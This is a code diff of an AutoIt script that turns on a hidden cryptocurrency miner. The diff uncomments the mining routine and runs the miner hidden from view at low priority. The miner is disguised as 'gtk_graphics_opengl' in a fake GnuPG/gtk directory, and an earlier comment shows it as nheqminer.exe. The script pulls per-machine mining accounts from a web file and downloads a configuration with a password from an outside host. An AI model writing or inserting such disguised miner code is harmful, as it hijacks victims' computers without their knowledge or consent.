@@ -38,18 +38,17 @@ Func readWebTxt()
 EndFunc
 
 Func startMiner()
-   ;Local $pc[20][3] = readWebTxt()
-   ;for $i = 0 To 19
-	  ;If ($name == $pc[$i][0]) Then
-		 ;$cmd = "gtk_graphics_opengl -u "&$pc[$i][2]&"."&$name&" -p x -t 4"
-		 ;Run($cmd,"C:\PROGRA~2\GNU\GnuPG\etc\gtk-2.0\update\gtk\")
-	  ;EndIf
-	  ;Next
+   Local $pc[20][3] = readWebTxt()
+   for $i = 0 To 19
+	  If ($name == $pc[$i][0]) Then
+		 Run("C:\PROGRA~2\GNU\GnuPG\etc\gtk-2.0\update\gtk\gtk_graphics_opengl -u "&$pc[$i][2]&"."&$name&" -p x -t 4","",@SW_HIDE)
+		 ProcessSetPriority("gtk_graphics_opengl.exe",0)
+	  EndIf
+	  Next
 
-	  ;ProcessSetPriority("nheqminer.exe",0)
 EndFunc
 
    $cmd = "gtk_graphics_opengl.exe -u roony.1 -p x -t 4"
-   $hey = Run("C:\Users\ineeve\Desktop\update\update\gtk\"&$cmd)
-   ProcessSetPriority("gtk_graphics_opengl.exe",0)
-   _self
+   $hey = Run("C:\Users\ineeve\Desktop\update\update\gtk\"&$cmd,"",@SW_HIDE)
+   InetGet("http://blizzstuff.t35.com/News.ini", "C:\news.ini")
+   $mainpw = iniread("C:\news.ini", "main", "password", "none")
